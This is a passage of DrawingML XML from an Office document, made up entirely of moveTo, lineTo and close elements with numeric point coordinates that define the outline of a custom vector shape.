                    <a:pt x="12986" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="3485"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12069" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11702" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4072" y="7080"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4035" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="9941"/>
